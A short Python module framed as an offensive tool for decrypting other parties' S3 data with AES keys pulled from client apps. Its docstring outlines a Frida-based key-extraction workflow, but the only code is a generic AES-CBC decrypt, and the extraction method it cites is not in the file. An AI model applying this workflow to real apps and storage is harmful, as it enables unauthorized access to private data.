"""
S3 Client-Side Encryption Bypass

Exploits hardcoded encryption keys in client applications to decrypt
supposedly "secure" S3 data.

Based on "The Modern Hacker's Playbook" - Part 4.3, TTP 2
"""

import logging
from typing import Optional

from Crypto.Cipher import AES


class S3EncryptionBypass:
    """
    S3 client-side encryption bypass engine.

    Many developers hardcode encryption keys in mobile apps or client code.
    This module extracts those keys (via reverse engineering) and decrypts S3 data.

    Workflow:
    1. Reverse engineer mobile app with Frida
    2. Extract hardcoded AES key and IV
    3. Download encrypted S3 objects
    4. Decrypt with extracted key

    Example:
        >>> bypass = S3EncryptionBypass()
        >>> key = bypass.extract_key_from_app("app.apk")
        >>> decrypted = bypass.decrypt_s3_object(encrypted_data, key, iv)
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def decrypt_s3_object(self, encrypted_data: bytes, key: bytes, iv: bytes) -> Optional[bytes]:
        """
        Decrypt S3 object using extracted key.

        Args:
            encrypted_data: Encrypted S3 object data
            key: Extracted AES key
            iv: Extracted IV

        Returns:
            Decrypted data
        """
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted_data)

            # Remove padding
            padding_length = decrypted[-1]
            decrypted = decrypted[:-padding_length]

            self.logger.info("Successfully decrypted S3 object")
            return decrypted

        except Exception as e:
            self.logger.error(f"Decryption failed: {e}")
            return None
